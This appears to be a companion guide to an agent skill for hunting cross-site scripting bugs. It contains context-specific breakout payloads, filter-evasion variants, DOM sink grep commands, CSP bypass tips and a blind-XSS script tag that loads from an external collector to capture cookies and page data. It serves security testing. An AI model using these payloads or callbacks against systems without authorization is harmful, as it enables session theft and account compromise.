# XSS Hunter — Deep Workflows

Companion to SKILL.md. Context analysis, exploitation chains, CSP review,
and blind-XSS operations.

## Step 1: Reflection discovery and context classification

For every parameter that reflects into responses, classify the CONTEXT
first — the context dictates the breakout:

| Context | Example response | Breakout requirement |
|---|---|---|
| HTML body | `<div>REFLECTION</div>` | `<script>` or event handler directly |
| Attribute | `<input value="REFLECTION">` | `" onfocus=alert(1) autofocus x="` |
| JS string | `var name = "REFLECTION";` | `";alert(1)//` or `\x27;alert(1)//` |
| URL attr | `<a href="REFLECTION">` | `javascript:alert(1)` |
| CSS value | `style="color:REFLECTION"` | `red;background:url(javascript:...)` legacy |
| Comment | `<!-- REFLECTION -->` | `--><script>alert(1)</script>` |

```bash
# Mark each reflection with a unique probe that survives encoding checks:
#   '"><img src=x onerror=PROBE>   -> tells you which chars survive
# Compare raw vs encoded reflections in Burp (Highlight + comment).
```

## Step 2: Event handler matrix (when <script> is filtered)

```text
onload onerror onfocus onblur onclick onmouseover ontoggle onanimationstart
onpointerover onbeforetoggle onscroll(+) onwheel oncopy onauxclick
```

Tag/handler combos that pass naive filters:

```html
<body onload=alert(1)>
<svg onload=alert(1)>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<video src=x onerror=alert(1)>
<style>@keyframes x{}</style><b style="animation-name:x" onanimationstart="alert(1)">
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<xss id=x tabindex=1 onactivate=alert(1)></xss>
<img src=1 onerror=&#97;lert(1)>          <!-- entity-encoded handler body -->
<svg><script href=data:,alert(1) />       <!-- script inside svg ns -->
```

## Step 3: Filter evasion ladder

Try in order after detecting a filter; keep raw payload first (lesson:
encoding too early causes false negatives):

```text
1. Case variants            <ScRiPt>
2. Null/tab/newline breaks  <scr\x09ipt>alert(1)</scr\x0Aipt>
3. Encoding                 &#106;avascript: / \u0061lert / %3Cscript%3E
4. Double encoding          %253Cscript%253E  (only after block confirmed)
5. Alternative syntax       alert`1` / (alert)(1) / top[/al/.source+ert]`(1)`
6. Without angle brackets   "autofocus onfocus=alert(1)"
7. Without alert keyword    [].constructor.constructor('alert(1)')()
```

## Step 4: DOM XSS sink/source hunting

Common sources: `location.hash`, `location.search`, `postMessage`,
`document.referrer`, `window.name`, localStorage.
Common sinks: `innerHTML`, `outerHTML`, `document.write`, `eval`,
`setTimeout(str)`, `jQuery $(html)`, `element.src=`.

```bash
# Grep JS bundles pulled by katana/browser devtools:
grep -rEn "(innerHTML|outerHTML|document\.write|eval\(|setTimeout\(['\"])" bundle.js

# postMessage handlers without origin check:
grep -n "addEventListener('message'" -A4 bundle.js | grep -v origin
```

Test with `#<img src=x onerror=alert(1)>` fragments; use DOM Invader if
available in Burp.

## Step 5: CSP analysis checklist

```http
Content-Security-Policy: default-src 'self'; script-src 'self' cdn.example.com
```

- `unsafe-inline` present? Direct injection works.
- `unsafe-eval`? Look for JSONP endpoints on allowed hosts.
- Allowed CDN list? Check each for JSONP (`?callback=`), AngularJS
  (`ng-*` attributes + angular.min.js = template injection), known-bypass libs.
- `script-src 'nonce-...'`: check whether nonce leaks into reflection.
- No CSP at all: note as hardening gap only (not standalone reportable).

## Step 6: Blind XSS operations

```html
<script src="https://your.bxss.host/bx"></script>
```
Payload placement queue: support chat messages, admin panel names,
user-agent spoof fields, profile fields rendered in backoffice, log viewers.

Collector must capture: page URL, DOM snapshot, cookies (flag HttpOnly),
screenshot. Correlate callback time with your submission timestamps.

## False-positive elimination

1. Confirm execution, not just reflection (view in real browser console).
2. Re-test after WAF cooldown — some WAFs only inspect first hit.
3. Verify impact path (which user roles see the injection point).
4. Screenshot console error absence (proves no CSP violation blocked it).
